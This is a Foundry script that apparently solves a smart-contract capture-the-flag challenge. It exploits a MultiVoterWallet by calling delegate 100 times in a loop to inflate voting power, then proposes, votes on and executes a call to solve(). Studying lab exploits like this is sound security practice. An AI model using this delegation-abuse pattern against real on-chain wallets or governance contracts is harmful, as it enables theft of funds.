// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/Setup3.sol";
import {MultiVoterWallet} from "../src/MultiVoterWallet.sol";
import {console} from "forge-std/console.sol";

contract MultiVoterScript is Script {
    function run() external {
        // Challenge address (replace with actual address)
        address challengeAddr = address(
            0x4D86bB7fA5430Ace83b2886c6934e0d189c17027
        );
        address playerAddr = vm.addr(0x0123);

        Setup setup = Setup(challengeAddr);
        MultiVoterWallet wallet = setup.wallet();

        vm.startBroadcast();

        for (uint i = 0; i < 100; i++) {
            wallet.delegate(address(0x1));
            wallet.delegate(address(setup));
            wallet.delegate(playerAddr);
        }
        wallet.propose(challengeAddr, abi.encodeWithSignature("solve()"));
        wallet.vote();
        wallet.execute();
        vm.stopBroadcast();

        // check if the challenge is solved
        console.log("isSolved: %s", setup.isSolved());
    }
}
